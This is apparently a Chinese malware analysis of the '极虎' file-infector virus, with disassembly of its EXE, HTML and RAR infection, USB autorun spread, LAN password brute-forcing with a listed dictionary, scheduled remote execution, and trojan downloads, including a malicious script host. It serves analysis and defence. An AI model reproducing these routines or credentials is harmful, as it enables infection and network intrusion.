+.text:0040635A           push    offset pszPath   ; pszPath
+
+.text:0040635F           call    ds:PathFileExistsA
+
+.text:00406365           mov     CRar_exe, eax
+```
+
+然后获取磁盘类型，避免无效分区和光驱，如果遇到无效和光驱则再次跳回接着感染：
+
+```
+.text:004063C3           push    [ebp+lpString]  ; lpRootPathName
+```
+
+
+
+## 获取磁盘类型
+
+```
+.text:004063C6           call    ds:GetDriveTypeA ; 获取磁盘类型  
+.text:004063CC           mov     [ebp+DriveType], eax  
+.text:004063CF           cmp     [ebp+DriveType], 1 ; 无效分区 DRIVE_NO_ROOT_DIR  
+.text:004063D3           jbe     short Next_2  
+.text:004063D5           cmp     [ebp+DriveType], 5  
+.text:004063D9           jz      short Next_2    ; 当是光驱的时候跳走  
+```
+
+如果磁盘是正常则开辟线程感染文件
+
+```
+.text:004063DB           push    0  
+.text:004063DD           push    0  
+.text:004063DF           mov     eax, [ebp+lpString]  
+.text:004063E2           push    dword ptr [eax]   ;文件路径做为参数  
+.text:004063E4           push    offset TaintFile_1 ; 创建线程感染文件  
+.text:004063E9           push    0  
+.text:004063EB           push    0  
+.text:004063ED           call    [ebp+CreateThread]  
+```
+
+### 排除系统文件
+
+感染文件之前还要检查路径，排除系统文件被感染，跳过 `WinRAR`，`WindowsUpdate`，`Windows NT`，`Windows Media Player`，`Outlook Express`，`NetMeeting`，`MSN Gaming Zone`，`Movie Maker`，`microsoft frontpage`，`Messenger`，`Internet Explorer`，`InstallShield Installation Information`，`ComPlus Applications`，`Common Files`，`RECYCLER`，`System Volume Information`，`Documents and Settings`，`WinNT`，`WINDOWS`，实现方法如下：
+
+```
+.text:00406220 NextSysFlod:  
+.text:00406220           mov     eax, [ebp+var_35C]  
+.text:00406226           inc     eax  
+.text:00406227           mov     [ebp+var_35C], eax  
+.text:0040622D loc_40622D:     
+.text:0040622D           cmp     [ebp+var_35C], 15h  
+.text:00406234           jge     short loc_40625A  
+.text:00406236           mov     eax, [ebp+var_35C]  
+.text:0040623C           push    lpString2[eax*4] ; lpString2  
+.text:00406243           push    [ebp+lpString1] ; lpString1  
+.text:00406249           call    ds:lstrcmpiA    ; 与指定的系统目录做比较  
+.text:0040624F           test    eax, eax  
+.text:00406251           jnz     short Next_1  
+.text:00406253           jmp     GoOutReturn     ; 避免感染系统目录内的文件  
+.text:00406253                               ; 找到系统目录后退出  
+.text:00406258 Next_1:                     
+.text:00406258           jmp     short NextSysFlod  
+```
+
+### 文件搜寻与感染
+
+下面通过 `FindFirstFile` 和 `FindNextFile` 搜寻文件，找到后调用感染函数感染之。
+
+下面是感染 `exe` 文件的主要过程，首先创建文件映射，在创建文件映射后修改节区数，映射内存长度，入口点地址，还有新增一个名为 `.tc` 的节区，之后定位到文件末尾，在文件末尾写入 shell 代码以及原 `OEP`。
+
+### 构造新节区
+
+```
+.text:0040727B           mov     eax, [ebp+EndOfLastTriv]  
+.text:00407281           mov     [ebp+var_50], eax  
+.text:00407284           mov     [ebp+var_40], 0E0000020h ; 节区属性  
+.text:0040728B           mov     ax, word ptr byte_40BE6C  
+.text:00407291           mov     [ebp+var_42], ax  
+.text:00407295           push    28h           ; size_t  
+.text:00407297           lea     eax, [ebp+ct.]  
+.text:0040729A           push    eax           ; void *  
+.text:0040729B           mov     eax, [ebp+NTAddress]  
+.text:004072A1           add     eax, [ebp+NTSecLen]  
+.text:004072A4           push    eax           ; void *  
+.text:004072A5           call    memcpy        ; 构造新节头  
+.text:004072AA           add     esp, 0Ch  
+.text:004072AD           mov     eax, [ebp+NTAddress]  
+.text:004072B3           movzx   eax, word ptr [eax+6]  
+.text:004072B7           inc     eax           ; 节头数加 1  
+.text:004072B8           mov     ecx, [ebp+NTAddress]  
+.text:004072BE           mov     [ecx+6], ax  
+.text:004072C2           mov     eax, [ebp+NTAddress]  
+.text:004072C8           cmp     dword ptr [eax+1Ch], 0  
+.text:004072CC           jz      short WriteShellCode ; 跳走写 shell 代码  
+```
+
+### 修改内存结构与写入代码
+
+```
+.text:004072E3           mov     eax, [ebp+NTAddress] ; 定位到 NT 头的地址  
+.text:004072E9           mov     ecx, [ebp+EndOfShellCode]  
+.text:004072EC           mov     [eax+28h], ecx  ; 修改入口点地址  
+.text:004072EF           mov     eax, [ebp+NTAddress]  
+.text:004072F5           mov     eax, [eax+50h]  
+.text:004072F8           add     eax, [ebp+var_5C]  
+.text:004072FB           mov     ecx, [ebp+NTAddress]  
+.text:00407301           mov     [ecx+50h], eax  ; 修改导入表的地址  
+.text:00407304           push    [ebp+lpBaseAddress] ; lpBaseAddress  
+.text:00407307           call    ds:UnmapViewOfFile  
+.text:0040731E           push    2             ; dwMoveMethod  
+.text:00407320           push    0             ; lpDistanceToMoveHigh  
+.text:00407322           mov     eax, [ebp+SplcaeEnd]  
+.text:00407328           add     eax, [ebp+var_54]  
+.text:0040732B           push    eax           ; lDistanceToMove  
+.text:0040732C           push    [ebp+hFile]   ; hFile  
+.text:0040732F           call    ds:SetFilePointer  
+.text:00407335           push    [ebp+hFile]   ; hFile  
+.text:00407338           call    ds:SetEndOfFile  
+.text:0040733E           push    2             ; dwMoveMethod  
+.text:00407340           push    0             ; lpDistanceToMoveHigh  
+.text:00407342           xor     eax, eax  
+.text:00407344           sub     eax, [ebp+var_54]  
+.text:00407347           push    eax           ; lDistanceToMove  
+.text:00407348           push    [ebp+hFile]   ; hFile  
+.text:0040734B           call    ds:SetFilePointer ; 定位到文件结尾  
+.text:00407351           push    0             ; lpOverlapped  
+.text:00407353           lea     eax, [ebp+NumberOfBytesWritten]  
+.text:00407356           push    eax           ; lpNumberOfBytesWritten  
+.text:00407357           push    297h          ; nNumberOfBytesToWrite  
+.text:0040735C           push    offset loc_409BA8 ; lpBuffer  
+.text:00407361           push    [ebp+hFile]   ; hFile  
+.text:00407364           call    ds:WriteFile    ; 写入感染 exe 的代码  
+```
+
+### 写入 Shell 代码与重定位
+
+```
+.text:0040736A           push    0             ; lpOverlapped  
+.text:0040736C           lea     eax, [ebp+NumberOfBytesWritten]  
+.text:0040736F           push    eax           ; lpNumberOfBytesWritten  
+.text:00407370           push    nNumberOfBytesToWrite  
+ ; nNumberOfBytesToWrite  
+.text:00407376           push    lpBuffer        ; lpBuffer  
+.text:0040737C           push    [ebp+hFile]     ; hFile  
+.text:0040737F           call    ds:WriteFile  
+.text:00407385           push    1             ; dwMoveMethod  
+.text:00407387           push    0             ; lpDistanceToMoveHigh  
+.text:00407389           xor     eax, eax  
+.text:0040738B           sub     eax, nNumberOfBytesToWrite  
+.text:00407391           sub     eax, 2Bh  
+.text:00407394           push    eax           ; lDistanceToMove  
+.text:00407395           push    [ebp+hFile]   ; hFile  
+.text:00407398           call    ds:SetFilePointer  
+.text:0040739E           push    0             ; lpOverlapped  
+.text:004073A0           lea     eax, [ebp+NumberOfBytesWritten]  
+.text:004073A3           push    eax           ; lpNumberOfBytesWritten  
+.text:004073A4           push    4             ; nNumberOfBytesToWrite  
+.text:004073A6           push    offset nNumberOfBytesToWrite ; lpBuffer  
+.text:004073AB           push    [ebp+hFile]   ; hFile  
+.text:004073AE           call    ds:WriteFile  
+.text:004073B4           mov     eax, [ebp+EndOfShellCode]  
+.text:004073B7           add     eax, 297h  
+.text:004073BC           mov     ecx, [ebp+OEP]  ; 保存 OEP  
+.text:004073C2           sub     ecx, eax  
+.text:004073C4           mov     [ebp+Buffer], ecx ; 重定位 OEP  
+```
+
+
+
+### 感染可执行文件逻辑
+
+```
+.text:004073C7 push 2 ; dwMoveMethod
+.text:004073C9 push 0 ; lpDistanceToMoveHigh
+.text:004073CB xor eax, eax
+.text:004073CD sub eax, [ebp+var_54]
+.text:004073D0 push eax ; lDistanceToMove
+.text:004073D1 push [ebp+hFile] ; hFile
+.text:004073D4 call ds:SetFilePointer
+.text:004073DA push 1 ; dwMoveMethod
+.text:004073DC push 0 ; lpDistanceToMoveHigh
+.text:004073DE push 293h ; lDistanceToMove
+.text:004073E3 push [ebp+hFile] ; hFile
+.text:004073E6 call ds:SetFilePointer
+.text:004073EC push 0 ; lpOverlapped
+.text:004073EE lea eax, [ebp+NumberOfBytesWritten]
+.text:004073F1 push eax ; lpNumberOfBytesWritten
+.text:004073F2 push 4 ; nNumberOfBytesToWrite
+.text:004073F4 lea eax, [ebp+Buffer]
+.text:004073F7 push eax ; lpBuffer
+.text:004073F8 push [ebp+hFile] ; hFile
+.text:004073FB call ds:WriteFile ; 将 OEP 写入被感染的 exe 文件
+.text:00407401 push 1 ; int
+.text:00407403 lea eax, [ebp+CreationTime]
+.text:00407409 push eax ; lpCreationTime
+.text:0040740A push [ebp+hFile] ; hFile
+.text:0040740D call FileOldTime ; 将被感染的文件的时间设置成之前的时间
+```
+
+### 感染 HTML/ASP 文件逻辑
+
+对于 `html` 和 `htm`，`asp`，`apsl` 格式文件则在该文件末尾写上一串 `<script type=""text/javascript"" src=""http://web.nba1001.net:8888/tj/tongji.js""></script>` 实现方法如下：
+
+```
+.text:00405AA9 push 0 ; hTemplateFile
+.text:00405AAB push 80h ; dwFlagsAndAttributes
+.text:00405AB0 push 3 ; dwCreationDisposition
+.text:00405AB2 push 0 ; lpSecurityAttributes
+.text:00405AB4 push 0 ; dwShareMode
+.text:00405AB6 push 0C0000000h ; dwDesiredAccess
+.text:00405ABB push [ebp+lpFileName] ; lpFileName
+.text:00405ABE call ds:CreateFileA ; 打开文件句柄
+.text:00405AC4 mov [ebp+hFile], eax
+.text:00405AC7 cmp [ebp+hFile], 0FFFFFFFFh
+.text:00405ACB jnz short loc_405AD6
+.text:00405ACD or [ebp+var_4], 0FFFFFFFFh
+.text:00405AD1 jmp loc_405B6A
+.text:00405AD6 loc_405AD6: ; CODE XREF:
+.text:00405AD6 push 0 ; int
+.text:00405AD8 lea eax, [ebp+CreationTime]
+.text:00405ADB push eax ; lpCreationTime
+.text:00405ADC push [ebp+hFile] ; hFile
+.text:00405ADF call FileOldTime ; 保留文件创建时间
+.text:00405AE4 push offset unk_40C690 ; lpString1
+.text:00405AE9 push [ebp+hFile] ; hFile
+.text:00405AEC call ReadMySlef
+.text:00405AF1 test eax, eax
+.text:00405AF3 jnz short loc_405B04
+.text:00405AF5 push [ebp+hFile] ; hObject
+.text:00405AF8 call ds:CloseHandle
+.text:00405AFE or [ebp+var_4], 0FFFFFFFFh
+.text:00405B02 jmp short loc_405B6A
+.text:00405B04 loc_405B04: ; CODE XREF: TaintThisFile+117 j
+.text:00405B04 push 2 ; dwMoveMethod
+.text:00405B06 push 0 ; lpDistanceToMoveHigh
+.text:00405B08 push 0 ; lDistanceToMove
+.text:00405B0A push [ebp+hFile] ; hFile
+.text:00405B0D call ds:SetFilePointer ; 移动文件指针到末尾
+.text:00405B13 push 0 ; lpOverlapped
+.text:00405B15 lea eax, [ebp+NumberOfBytesWritten]
+.text:00405B18 push eax ; lpNumberOfBytesWritten
+.text:00405B19 push offset unk_40C690 ; lpString
+.text:00405B1E call ds:lstrlenA
+.text:00405B24 push eax ; nNumberOfBytesToWrite
+.text:00405B25 push offset unk_40C690 ; lpBuffer
+.text:00405B2A push [ebp+hFile] ; hFile
+.text:00405B2D call ds:WriteFile ; 将感染字符串写入到文件的末尾
+.text:00405B33 push 1 ; int
+.text:00405B35 lea eax, [ebp+CreationTime]
+.text:00405B38 push eax ; lpCreationTime
+.text:00405B39 push [ebp+hFile] ; hFile
+.text:00405B3C call FileOldTime ; 设置时间到之前
+.text:00405B41 push [ebp+hFile] ; hObject
+.text:00405B44 call ds:CloseHandle
+```
+
+### 感染 RAR 文件逻辑
+
+如果是 `RAR` 文件则跳到这里，病毒会调用 `C:\\Program Files\\WinRAR\\Rar.exe`，并加 `%s X -ibck "%s" "%s\` 的参数把压缩包中的文件释放到临时目录。然后感染解压出来的的 `exe`，`rar`，`htm`，`html`，`asp`，`aspx` 等文件，感染完毕会调用 `rar.exe` 加参数 `%s M -ibck -r -o+ -ep1 "%s" "%s\\*\` 把压缩包放回。
+
+```
+.text:004060D9 TaintRAR: ; CODE XREF:
+.text:004060D9 push offset aRar ; "rar"
+.text:004060DE push [ebp+lpString1] ; lpString1
+.text:004060E4 call ds:lstrcmpiA ; 如果判断是 rar 则跳到这里来感染
+.text:004060EA test eax, eax
+.text:004060EC jnz short GameOver
+.text:004060EE and [ebp+hObject], 0
+.text:004060F5 push 0 ; lpThreadId
+.text:004060F7 push 0 ; dwCreationFlags
+.text:004060F9 lea eax, [ebp+Parameter]
+.text:004060FF push eax ; lpParameter
+.text:00406100 push offset TaintRAR ; lpStartAddress
+.text:00406105 push 0 ; dwStackSize
+.text:00406107 push 0 ; lpThreadAttributes
+.text:00406109 call ds:CreateThread ; 开新线程感染 rar 压缩包
+.text:0040612D push 0FFFFFFFFh ; dwMilliseconds
+.text:0040612F push [ebp+hObject] ; hHandle
+.text:00406135 call ds:WaitForSingleObject ; 等待感染 rar 的线程结束
+```
+
+### 下面是感染过程
+
+```
+.text:00405C17 push 0
+.text:00405C19 push 80h
+.text:00405C1E push 3
+.text:00405C20 push 0
+.text:00405C22 push 3
+.text:00405C24 push 0C0000000h
+.text:00405C29 lea eax, [ebp+FileName]
+.text:00405C2F push eax
+.text:00405C30 call [ebp+CreateFileA] ; 创建文件句柄
+.text:00405C36 mov [ebp+hFile], eax
+.text:00405C3C push 0 ; lpFileSizeHigh
+.text:00405C3E push [ebp+hFile] ; hFile
+.text:00405C44 call ds:GetFileSize
+.text:00405C4A mov [ebp+var_40C], eax
+.text:00405C50 cmp [ebp+var_40C], 0
+.text:00405C57 jz short GoOutReturn ; 文件长度为 0 跳走退出
+.text:00405C59 cmp [ebp+var_40C], 0FFFFFFFFh
+.text:00405C60 jz short GoOutReturn ; 获取文件长度失败跳走退出
+```
+
+
+
+### 文件创建与进程处理逻辑
+
+```assembly
+.text:00405C62             cmp     [ebp+var_40C], 0A00000h
+
+.text:00405C6C             ja      short GoOutReturn ; 文件过大退出
+
+.text:00405C6E             cmp     [ebp+var_40C], 2800h
+
+.text:00405C78             jnb     short loc_405C90
+
+.text:00405C9F             call    FileOldTime     ; 获取该文件源创建时间\
+
+.text:00405D84             push    eax             ; lpStartupInfo
+
+.text:00405D85             push    0               ; lpCurrentDirectory
+
+.text:00405D87             push    0               ; lpEnvironment
+
+.text:00405D89             push    0C000000h       ; dwCreationFlags
+
+.text:00405D8E             push    1               ; bInheritHandles
+
+.text:00405D90             push    0               ; lpThreadAttributes
+
+.text:00405D92             push    0               ; lpProcessAttributes
+
+.text:00405D94             lea     eax, [ebp+CommandLine]
+
+.text:00405D9A             push    eax             ; lpCommandLine
+
+.text:00405D9B             push    0               ; lpApplicationName
+
+.text:00405D9D             call    ds:CreateProcessA ; 将 C:\\Program Files\WinRAR\Rar.exe,; 并加%s X -ibck \"%s\" \"%s\\*\"内以命令行参数运行之
+
+.text:00405E3B             call    TaintFile_0 ; 解压压缩包后感染压缩包内的文件
+
+.text:00405EB3             push    eax             ; lpStartupInfo
+
+.text:00405EB4             push    0               ; lpCurrentDirectory
+
+.text:00405EB6             push    0               ; lpEnvironment
+
+.text:00405EB8             push    0C000000h       ; dwCreationFlags
+
+.text:00405EBD             push    1               ; bInheritHandles
+
+.text:00405EBF             push    0               ; lpThreadAttributes
+
+.text:00405EC1             push    0               ; lpProcessAttributes
+
+.text:00405EC3             lea     eax, [ebp+CommandLine]
+
+.text:00405EC9             push    eax             ; lpCommandLine
+
+.text:00405ECA             push    0               ; lpApplicationName
+
+.text:00405ECC             call    ds:CreateProcessA ; 再将压缩程序并入"%s M -ibck -r -o+ -ep1 \"%s\" \"%s\\*\""以命令行参数运行之，将感染后的文件打包压缩回去
+
+.text:00405F03             push    0               ; hTemplateFile
+
+.text:00405F05             push    80h             ; dwFlagsAndAttributes
+
+.text:00405F0A             push    3               ; dwCreationDisposition
+
+.text:00405F0C             push    0               ; lpSecurityAttributes
+
+.text:00405F0E             push    3               ; dwShareMode
+
+.text:00405F10             push    0C0000000h      ; dwDesiredAccess
+
+.text:00405F15             lea     eax, [ebp+FileName]
+
+.text:00405F1B             push    eax             ; lpFileName
+
+.text:00405F1C             call    ds:CreateFileA  ; 创建文件句柄，准备将感染后的 rar 文件设置成原来的时间
+
+.text:00405F22             mov     [ebp+hFile], eax
+
+.text:00405F28             push    1               ; int
+
+.text:00405F2A             lea     eax, [ebp+CreationTime]
+
+.text:00405F30             push    eax             ; lpCreationTime
+
+.text:00405F31             push    [ebp+hFile]     ; hFile
+
+.text:00405F37             call    FileOldTime     ; 将被感染后的 RAR 文件设置成原来的时间
+```
+
+### 磁盘感染与持久化
+
+下面是感染磁盘的过程，过程为搜索磁盘并判断类型，如果是可移动磁盘则获得系统内的盘符，查找可移动存储，并把自身复制到这个盘下面的 `recycle.{645FF040-5081-101B-9F08-00AA002F954E}\setup.exe`，并创建 `autorun.inf` 文件，过程如下：
+
+```assembly
+.text:00408B08             push    eax
+
+.text:00408B09             call    [ebp+GetDriveTypeA]
+
+.text:00408B0C             cmp     eax, 2
+
+.text:00408B0F             jnz     short GoOutGetNext ; 非可移动磁盘，跳走
+
+.text:00408B11             lea     eax, [ebp+var_18]
+
+.text:00408B14             push    eax
+
+.text:00408B15             call    FautorunWR      ; 在磁盘上创建 autorun.ini
+
+.text:0040870E             push    offset aSetup_exe ; "Setup.exe"
+
+.text:00408713             lea     eax, [ebp+PathName]
+
+.text:00408719             push    eax
+
+.text:0040871A             push    offset aSS      ; "%s\%s"
+
+.text:0040871F             lea     eax, [ebp+FileName]
+
+.text:00408725             push    eax             ; LPSTR
+
+.text:00408726             call    ds:wsprintfA    ; 构建 recycle.{645FF040-5081-101B-9F08-00AA002F954E}\setup.exe 路径
+
+.text:00408836             push    1               ; dwFlags
+
+.text:00408838             lea     eax, [ebp+NewFileName]
+
+.text:0040883E             push    eax             ; lpNewFileName
+
+.text:0040883F             lea     eax, [ebp+pszPath]
+
+.text:00408845             push    eax             ; lpExistingFileName
+
+.text:00408846             call    ds:MoveFileExA  ; 将自身复制过去
+```
+
+### 局域网传播凭证
+
+该病毒通过局域网传播，使用用户名 `Administrator` `Guest` `Admin` `Root`。
+
+用户密码：
+
+`234.password.6969.harley.123456.golf.pussy.mustang. 1111.shadow.1313.fish.5150.7777.qwerty.baseball.2112.letmein.`
+
+`12345678.12345.ccc.admin.5201314.qq520.1.12.123.1234567.`
+
+`123456789.654321.54321.111.000000.abc.pw.11111111.`
+
+`88888888.pass.passwd.database.abcd.abc123.pass.sybase.`
+
+`123qwe.server.computer.520.super.123asd.0.ihavenopass.`
+
+`godblessyou.enable.xp.2002.2003.2600.alpha.110.111111.`
+
+`121212.123123.1234qwer.`
+
+`123abc.007.a.aaa.patrick.pat.administrator.root.sex.god.`
+
+`fuckyou.fuck.abc.test.test123.temp.temp123.win.pc.asdf.pwd.`
+
+`qwer.yxcv.zxcv.home.xxx.owner.login.Login.pw123.love.mypc.`
+
+`mypc123.admin123.mypass.mypass123.901100.`
+
+### 局域网攻击逻辑
+
+下面是攻击局域网用户：
+
+```assembly
+.text:004083F1             mov     [ebp+lpUserName], offset UserName_0 ; 取第一个用户名
+
+.text:004083F8 UserNext:
+
+.text:004083F8             mov     eax, [ebp+lpUserName]
+
+.text:004083FB             movsx   eax, byte ptr [eax]
+
+.text:004083FE             test    eax, eax
+
+.text:00408400             jz      loc_408492
+
+.text:00408406             cmp     [ebp+var_4], 0
+
+.text:0040840A             jnz     loc_408492
+
+.text:00408410             mov     [ebp+var_54], 1
+
+.text:00408417             mov     [ebp+lpPassword], offset UserPassword ; 取第一个密码
+
+PassWordNext:
+
+.text:0040841E             mov     eax, [ebp+lpPassword]
+
+.text:00408421             movsx   eax, byte ptr [eax]
+
+.text:00408424             test    eax, eax
+
+.text:00408426             jz      short GetNextUserName
+
+.text:00408428             cmp     [ebp+var_54], 1
+
+.text:0040842C             jnz     short SendVirToNet
+
+.text:0040842E             mov     [ebp+lpPassword], offset UserName
+
+.text:00408435 SendVirToNet:                  ; CODE XREF:
+
+.text:00408435             push    [ebp+lpPassword] ; lpPassword
+
+.text:00408438             push    [ebp+lpUserName] ; lpUserName
+
+.text:0040843B             lea     eax, [ebp+String1]
+
+.text:0040843E             push    eax             ; int
+
+.text:0040843F             call    SendVirNet      ; 上传病毒到局域网电脑上设置 3 分钟后运行
+
+.text:00408444             cmp     eax, 1
+
+.text:00408447             jnz     short loc_408452
+
+.text:00408449             mov     [ebp+var_4], 1
+
+.text:00408450             jmp     short GetNextUserName
+
+.text:00408452 loc_408452:                    ; CODE XREF:
+
+.text:00408452             cmp     [ebp+var_54], 1
+
+.text:00408456             jnz     short loc_408465
+
+.text:00408458             mov     [ebp+lpPassword], offset UserPassword
+
+.text:0040845F             and     [ebp+var_54], 0
+
+.text:00408463             jmp     short GoNextPassWord ; 跳回接着比较
+
+.text:00408465 loc_408465:                    ; CODE XREF:
+
+.text:00408465             push    [ebp+lpPassword] ; lpString
+
+.text:00408468             call    ds:lstrlenA
+```
+
+
+
+# 病毒分析
+
+## 上传逻辑
+
+上传时首先构建 `at` 命令，设置上传成功后三分钟运行，上传位置到 `C:\CONFIG.EXE`。
+
+```assembly
+.text:00408354                 push    offset aConfig  ; "CONFIG"
+.text:00408359                 movzx   eax, [ebp+SystemTime.wMinute]
+.text:00408360                 add     eax, 3
+.text:00408363                 push    eax
+.text:00408364                 movzx   eax, [ebp+SystemTime.wHour]
+.text:0040836B                 push    eax
+.text:0040836C                 push    [ebp+arg_0]
+.text:0040836F                 push    offset aAtSDDCS_exe ; "at \\\\%s %d:%d C:\\%s.exe"
+.text:00408374                 lea     eax, [ebp+CmdLine]
+.text:0040837A                 push    eax             ; 设置 at 命令
+.text:0040837B                 call    [ebp+var_24]
+.text:0040837E                 add     esp, 18h
+.text:00408381                 push    0               ; uCmdShow
+.text:00408383                 lea     eax, [ebp+CmdLine]
+.text:00408389                 push    eax             ; lpCmdLine
+.text:0040838A                 call    ds:WinExec      ; 运行 at 命令..
+.text:00408397                 push    [ebp+hObject]   ; hObject
+.text:0040839A                 call    ds:CloseHandle
+.text:004083A0 loc_4083A0:                      ; CODE XREF:
+.text:004083A0                 push    1               ; fForce
+.text:004083A2                 push    1               ; dwFlags
+.text:004083A4                 lea     eax, [ebp+Name]
+.text:004083A7                 push    eax             ; lpName
+.text:004083A8                 call    WNetCancelConnection2A ;
+```
+
+## 下载木马过程
+
+下面是下载木马的过程。
+
+```assembly
+.text:00402DAC GetNextIP:
+.text:00402DAC                 xor     eax, eax
+.text:00402DAE                 inc     eax
+.text:00402DAF                 jz      FailReturn
+.text:00402DB5                 push    40h             ; size_t
+.text:00402DB7                 push    0               ; int
+.text:00402DB9                 lea     eax, [ebp+String2]
+.text:00402DBF                 push    eax             ; void *
+.text:00402DC0                 call    memset
+.text:00402DC5                 add     esp, 0Ch
+.text:00402DC8                 push    0               ; int
+.text:00402DCA                 push    40h             ; dwAddressStringLength
+.text:00402DCC                 lea     eax, [ebp+String2]
+.text:00402DD2                 push    eax             ; lpString2
+.text:00402DD3                 push    [ebp+arg_8]     ; int
+.text:00402DD6                 push    [ebp+var_4]      ; int
+.text:00402DD9                 call    GetAddrInfo     ; 获取地址信息
+.text:00402DDE                 test    eax, eax
+.text:00402DE0                 jnz   short SucessGetAdd ; 获取地址信息成功跳走下载木马
+.text:00402DE2                 and     [ebp+var_8], 0
+.text:00402DE6                 jmp     short FailReturn ; 获取地址信息失败跳走
+.text:00402DE8 SucessGetAdd:
+.text:00402DE8                 push    400h            ; size_t
+.text:00402DED                 push    0               ; int
+.text:00402DEF                 lea     eax, [ebp+var_410]
+.text:00402DF5                 push    eax             ; void *
+.text:00402DF6                 call    memset
+.text:00402DFB                 add     esp, 0Ch
+.text:00402DFE                 push    [ebp+arg_4]
+.text:00402E01                 push    dword_40BE64    ; 1F90h
+.text:00402E07                 lea     eax, [ebp+String2]
+.text:00402E0D                 push    eax
+.text:00402E0E                 push    offset aHttpSDS ; "http://%s:%d/%s"
+.text:00402E13                 lea     eax, [ebp+var_410]
+.text:00402E19                 push    eax             ; LPSTR
+.text:00402E1A                 call    ds:wsprintfA    ; 构造木马路径
+.text:00402E20                 add     esp, 14h
+.text:00402E23                 push    [ebp+lpFileName] ; lpFileName
+.text:00402E26                 call    ds:DeleteFileA
+.text:00402E2C                 push    [ebp+lpFileName] ; lpFileName
+.text:00402E2F                 lea     eax, [ebp+var_410]
+.text:00402E35                 push    eax             ; int
+.text:00402E36                 call    ReadInternetFile ; 从网上读取数据
+.text:00402E3B                 cmp     eax, 1
+.text:00402E3E                 jnz   short SucessRead ; 读取成功通过这里跳回接着读取
+.text:00402E40                 mov     [ebp+var_8], 1
+.text:00402E47                 jmp     short FailReturn
+.text:00402E49 SucessRead:
+.text:00402E49                 jmp     GetNextIP
+```
+
+## 其他指令
+
+```assembly
+.text:0040846E                 mov     ecx, [ebp+lpPassword]
+.text:00408471                 lea     eax, [ecx+eax+1]
+.text:00408475                 mov     [ebp+lpPassword], eax ; 取下一个密码
+.text:00408478 GoNextPassWord:                   ; CODE XREF:
+.text:00408478                 jmp     short PassWordNext ; 跳回接着比较
+.text:0040847A GetNextUserName:                  ; CODE XREF:
+.text:0040847A                 push    [ebp+lpUserName] ; lpString
+.text:0040847D                 call    ds:lstrlenA
+.text:00408483                 mov     ecx, [ebp+lpUserName]
+.text:00408486                 lea     eax, [ecx+eax+1]
+.text:0040848A                 mov     [ebp+lpUserName], eax ; 取下一个用户名
+.text:0040848D                 jmp     UserNext
+```
+
+## 附件信息
+
+附件中的病毒为隐藏文件，注意在虚拟机中调试。
+
+| 图片 | 文件 |
+| :--- | :--- |
+| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) | `极虎病毒.rar` [解压密码：`killvirus`] |
